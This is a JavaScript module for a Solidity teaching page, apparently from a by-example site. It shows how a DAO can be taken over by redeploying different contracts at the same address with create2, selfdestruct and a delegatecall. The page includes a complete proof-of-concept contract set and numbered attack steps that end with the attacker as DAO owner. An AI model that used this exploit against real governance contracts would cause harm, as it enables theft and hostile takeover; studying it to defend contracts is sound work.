// metadata
export const version = "0.8.26"
export const title = "Deploy Different Contracts at the Same Address"
export const description =
  "An example of a Solidity contract vulnerable to deploy different contracts at the same address"
export const cyfrinLink = ""

export const keywords = [
  "hack",
  "security",
  "deploy",
  "salt",
  "create",
  "create2",
  "different",
  "contract",
  "same",
  "address",
]

export const codes = [
  {
    fileName: "TornadoHack.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCkNhbGxlZCBieSBBbGljZQowLiBEZXBsb3kgREFPCgpDYWxsZWQgYnkgQXR0YWNrZXIKMS4gRGVwbG95IERlcGxveWVyRGVwbG95ZXIKMi4gQ2FsbCBEZXBsb3llckRlcGxveWVyLmRlcGxveSgpCjMuIENhbGwgRGVwbG95ZXIuZGVwbG95UHJvcG9zYWwoKQoKQ2FsbGVkIGJ5IEFsaWNlCjQuIEdldCBEQU8gYXBwcm92YWwgb2YgUHJvcG9zYWwKCkNhbGxlZCBieSBBdHRhY2tlcgo1LiBEZWxldGUgUHJvcG9zYWwgYW5kIERlcGxveWVyCjYuIFJlLWRlcGxveSBEZXBsb3llcgo3LiBDYWxsIERlcGxveWVyLmRlcGxveUF0dGFjaygpCjguIENhbGwgREFPLmV4ZWN1dGUKOS4gQ2hlY2sgREFPLm93bmVyIGlzIGF0dGFja2VyJ3MgYWRkcmVzcwoKREFPIC0tIGFwcHJvdmVkIC0tPiBQcm9wb3NhbApEZXBsb3llckRlcGxveWVyIC0tIGNyZWF0ZTIgLS0+IERlcGxveWVyIC0tIGNyZWF0ZSAtLT4gUHJvcG9zYWwKRGVwbG95ZXJEZXBsb3llciAtLSBjcmVhdGUyIC0tPiBEZXBsb3llciAtLSBjcmVhdGUgLS0+IEF0dGFjawoqLwoKY29udHJhY3QgREFPIHsKICAgIHN0cnVjdCBQcm9wb3NhbCB7CiAgICAgICAgYWRkcmVzcyB0YXJnZXQ7CiAgICAgICAgYm9vbCBhcHByb3ZlZDsKICAgICAgICBib29sIGV4ZWN1dGVkOwogICAgfQoKICAgIGFkZHJlc3MgcHVibGljIG93bmVyID0gbXNnLnNlbmRlcjsKICAgIFByb3Bvc2FsW10gcHVibGljIHByb3Bvc2FsczsKCiAgICBmdW5jdGlvbiBhcHByb3ZlKGFkZHJlc3MgdGFyZ2V0KSBleHRlcm5hbCB7CiAgICAgICAgcmVxdWlyZShtc2cuc2VuZGVyID09IG93bmVyLCAibm90IGF1dGhvcml6ZWQiKTsKCiAgICAgICAgcHJvcG9zYWxzLnB1c2goCiAgICAgICAgICAgIFByb3Bvc2FsKHt0YXJnZXQ6IHRhcmdldCwgYXBwcm92ZWQ6IHRydWUsIGV4ZWN1dGVkOiBmYWxzZX0pCiAgICAgICAgKTsKICAgIH0KCiAgICBmdW5jdGlvbiBleGVjdXRlKHVpbnQyNTYgcHJvcG9zYWxJZCkgZXh0ZXJuYWwgcGF5YWJsZSB7CiAgICAgICAgUHJvcG9zYWwgc3RvcmFnZSBwcm9wb3NhbCA9IHByb3Bvc2Fsc1twcm9wb3NhbElkXTsKICAgICAgICByZXF1aXJlKHByb3Bvc2FsLmFwcHJvdmVkLCAibm90IGFwcHJvdmVkIik7CiAgICAgICAgcmVxdWlyZSghcHJvcG9zYWwuZXhlY3V0ZWQsICJleGVjdXRlZCIpOwoKICAgICAgICBwcm9wb3NhbC5leGVjdXRlZCA9IHRydWU7CgogICAgICAgIChib29sIG9rLCkgPSBwcm9wb3NhbC50YXJnZXQuZGVsZWdhdGVjYWxsKAogICAgICAgICAgICBhYmkuZW5jb2RlV2l0aFNpZ25hdHVyZSgiZXhlY3V0ZVByb3Bvc2FsKCkiKQogICAgICAgICk7CiAgICAgICAgcmVxdWlyZShvaywgImRlbGVnYXRlY2FsbCBmYWlsZWQiKTsKICAgIH0KfQoKY29udHJhY3QgUHJvcG9zYWwgewogICAgZXZlbnQgTG9nKHN0cmluZyBtZXNzYWdlKTsKCiAgICBmdW5jdGlvbiBleGVjdXRlUHJvcG9zYWwoKSBleHRlcm5hbCB7CiAgICAgICAgZW1pdCBMb2coIkV4Y3V0ZWQgY29kZSBhcHByb3ZlZCBieSBEQU8iKTsKICAgIH0KCiAgICBmdW5jdGlvbiBlbWVyZ2VuY3lTdG9wKCkgZXh0ZXJuYWwgewogICAgICAgIHNlbGZkZXN0cnVjdChwYXlhYmxlKGFkZHJlc3MoMCkpKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIGV2ZW50IExvZyhzdHJpbmcgbWVzc2FnZSk7CgogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CgogICAgZnVuY3Rpb24gZXhlY3V0ZVByb3Bvc2FsKCkgZXh0ZXJuYWwgewogICAgICAgIGVtaXQgTG9nKCJFeGN1dGVkIGNvZGUgbm90IGFwcHJvdmVkIGJ5IERBTyA6KSIpOwogICAgICAgIC8vIEZvciBleGFtcGxlIC0gc2V0IERBTydzIG93bmVyIHRvIGF0dGFja2VyCiAgICAgICAgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgfQp9Cgpjb250cmFjdCBEZXBsb3llckRlcGxveWVyIHsKICAgIGV2ZW50IExvZyhhZGRyZXNzIGFkZHIpOwoKICAgIGZ1bmN0aW9uIGRlcGxveSgpIGV4dGVybmFsIHsKICAgICAgICBieXRlczMyIHNhbHQgPSBrZWNjYWsyNTYoYWJpLmVuY29kZSh1aW50MjU2KDEyMykpKTsKICAgICAgICBhZGRyZXNzIGFkZHIgPSBhZGRyZXNzKG5ldyBEZXBsb3llcntzYWx0OiBzYWx0fSgpKTsKICAgICAgICBlbWl0IExvZyhhZGRyKTsKICAgIH0KfQoKY29udHJhY3QgRGVwbG95ZXIgewogICAgZXZlbnQgTG9nKGFkZHJlc3MgYWRkcik7CgogICAgZnVuY3Rpb24gZGVwbG95UHJvcG9zYWwoKSBleHRlcm5hbCB7CiAgICAgICAgYWRkcmVzcyBhZGRyID0gYWRkcmVzcyhuZXcgUHJvcG9zYWwoKSk7CiAgICAgICAgZW1pdCBMb2coYWRkcik7CiAgICB9CgogICAgZnVuY3Rpb24gZGVwbG95QXR0YWNrKCkgZXh0ZXJuYWwgewogICAgICAgIGFkZHJlc3MgYWRkciA9IGFkZHJlc3MobmV3IEF0dGFjaygpKTsKICAgICAgICBlbWl0IExvZyhhZGRyKTsKICAgIH0KCiAgICBmdW5jdGlvbiBraWxsKCkgZXh0ZXJuYWwgewogICAgICAgIHNlbGZkZXN0cnVjdChwYXlhYmxlKGFkZHJlc3MoMCkpKTsKICAgIH0KfQo=",
  },
]

const html = `<p>Contract address deployed with <code>create</code> is computed in the following way.</p>
<pre><code>contract address = last 20 bytes of sha3(rlp_encode(sender, nonce))
</code></pre><p>where <code>sender</code> is the address of the deployer and <code>nonce</code> is the number of transactions sent by <code>sender</code>.</p>
<p>Hence it is possible to deploy different contracts at the same address if we can somehow reset the <code>nonce</code>.</p>
<p>Below is an example of how a DAO can be hacked.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.26;</span>

<span class="hljs-comment">/*
Called by Alice
0. Deploy DAO

Called by Attacker
1. Deploy DeployerDeployer
2. Call DeployerDeployer.deploy()
3. Call Deployer.deployProposal()

Called by Alice
4. Get DAO approval of Proposal

Called by Attacker
5. Delete Proposal and Deployer
6. Re-deploy Deployer
7. Call Deployer.deployAttack()
8. Call DAO.execute
9. Check DAO.owner is attacker&#x27;s address

DAO -- approved --&gt; Proposal
DeployerDeployer -- create2 --&gt; Deployer -- create --&gt; Proposal
DeployerDeployer -- create2 --&gt; Deployer -- create --&gt; Attack
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">DAO</span> </span>{
    <span class="hljs-keyword">struct</span> <span class="hljs-title">Proposal</span> {
        <span class="hljs-keyword">address</span> target;
        <span class="hljs-keyword">bool</span> approved;
        <span class="hljs-keyword">bool</span> executed;
    }

    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    Proposal[] <span class="hljs-keyword">public</span> proposals;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> target</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> owner, <span class="hljs-string">"not authorized"</span>);

        proposals.<span class="hljs-built_in">push</span>(
            Proposal({target: target, approved: <span class="hljs-literal">true</span>, executed: <span class="hljs-literal">false</span>})
        );
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> proposalId</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        Proposal <span class="hljs-keyword">storage</span> proposal <span class="hljs-operator">=</span> proposals[proposalId];
        <span class="hljs-built_in">require</span>(proposal.approved, <span class="hljs-string">"not approved"</span>);
        <span class="hljs-built_in">require</span>(<span class="hljs-operator">!</span>proposal.executed, <span class="hljs-string">"executed"</span>);

        proposal.executed <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;

        (<span class="hljs-keyword">bool</span> ok,) <span class="hljs-operator">=</span> proposal.target.<span class="hljs-built_in">delegatecall</span>(
            <span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"executeProposal()"</span>)
        );
        <span class="hljs-built_in">require</span>(ok, <span class="hljs-string">"delegatecall failed"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Proposal</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> message</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">executeProposal</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"Executed code approved by DAO"</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">emergencyStop</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-built_in">selfdestruct</span>(<span class="hljs-keyword">payable</span>(<span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>)));
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> message</span>)</span>;

    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">executeProposal</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-keyword">emit</span> Log(<span class="hljs-string">"Executed code not approved by DAO :)"</span>);
        <span class="hljs-comment">// For example - set DAO&#x27;s owner to attacker</span>
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">DeployerDeployer</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> addr</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deploy</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-keyword">bytes32</span> salt <span class="hljs-operator">=</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(<span class="hljs-keyword">uint256</span>(<span class="hljs-number">123</span>)));
        <span class="hljs-keyword">address</span> addr <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-keyword">new</span> Deployer{<span class="hljs-built_in">salt</span>: salt}());
        <span class="hljs-keyword">emit</span> Log(addr);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Deployer</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> addr</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deployProposal</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-keyword">address</span> addr <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-keyword">new</span> Proposal());
        <span class="hljs-keyword">emit</span> Log(addr);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deployAttack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-keyword">address</span> addr <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-keyword">new</span> Attack());
        <span class="hljs-keyword">emit</span> Log(addr);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">kill</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        <span class="hljs-built_in">selfdestruct</span>(<span class="hljs-keyword">payable</span>(<span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>)));
    }
}
</code></pre>`

export default html
